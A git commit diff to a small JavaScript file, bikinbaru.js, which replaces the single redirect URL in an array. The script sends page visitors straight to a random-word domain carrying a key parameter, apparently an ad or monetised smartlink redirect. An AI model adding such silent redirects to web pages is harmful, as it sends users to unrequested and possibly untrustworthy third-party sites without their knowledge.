2fb69efe3c302813f6e16dd81efc9ed10cca79c5
kempelajonk <84513484+kempelajonk@users.noreply.github.com>
2021-06-01 12:48:58 +0800

    Update bikinbaru.js

--- bikinbaru.js
+++ bikinbaru.js
@@ -1,6 +1,6 @@
 var dataUrl = [
   
-  'https://primevalcherries.com/a8cwjakuu?key=079bebe14074c0345b33aa3d9edf4c15'
+  'https://routemomentarilydiscovering.com/a8cwjakuu?key=079bebe14074c0345b33aa3d9edf4c15'
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
